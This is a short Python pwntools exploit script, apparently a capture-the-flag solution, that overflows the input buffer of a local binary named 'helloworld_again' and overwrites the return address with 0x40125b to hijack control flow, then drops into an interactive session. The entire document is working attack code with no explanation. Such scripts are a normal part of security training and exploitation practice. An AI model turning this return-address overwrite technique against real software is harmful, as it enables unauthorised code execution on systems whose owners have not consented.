from pwn import *

p = process("./helloworld_again")

jump_to = p64(0x40125b)
payload = b'helloworld\0' + b'A' * 45 + jump_to

p.recvuntil("Say helloworld !!!")
p.send(payload)

p.interactive()
